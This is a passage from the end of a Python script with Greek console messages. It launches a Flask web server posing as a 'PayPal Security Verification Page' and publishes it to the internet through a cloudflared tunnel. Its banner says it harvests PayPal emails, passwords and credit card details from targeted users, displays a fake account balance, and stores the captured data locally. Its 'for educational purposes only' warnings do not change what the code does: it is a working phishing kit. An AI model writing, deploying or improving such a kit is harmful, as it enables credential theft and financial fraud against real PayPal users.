            print(f"🔐 Τα διαπιστευτήρια και τα στοιχεία κάρτας θα αποθηκευτούν")
            print(f"💾 Τοποθεσία αποθήκευσης: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικά διαπιστευτήρια PayPal!")
            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικούς αριθμούς πιστωτικών καρτών!")
            print("⚠️  Οι απάτες PayPal στοχεύουν εκατομμύρια χρήστες καθημερινά!")
            print("⚠️  Οι οικονομικές πληροφορίες είναι εξαιρετικά πολύτιμες!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5013, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Σελίδας Επαλήθευσης Ασφαλείας PayPal...")
    print("📱 Θύρα: 5013")
    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/PayPal/")
    print("💰 Εμφάνιση Υπολοίπου: $2,847.63")
    print("🔐 Συλλογή: Email, Κωδικός, Στοιχεία Πιστωτικής Κάρτας")
    print("🎯 Στόχος: Χρήστες PayPal που χρειάζονται 'επαλήθευση'")
    print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Οι απάτες 'επαλήθευσης ασφαλείας' είναι πολύ συχνές!")
    print("⚠️  Η οικονομική ηλεκτρονική απάτη μπορεί να οδηγήσει σε κλοπή ταυτότητας!")
    print("⏳ Αναμονή για σήραγγα cloudflared...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5013")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)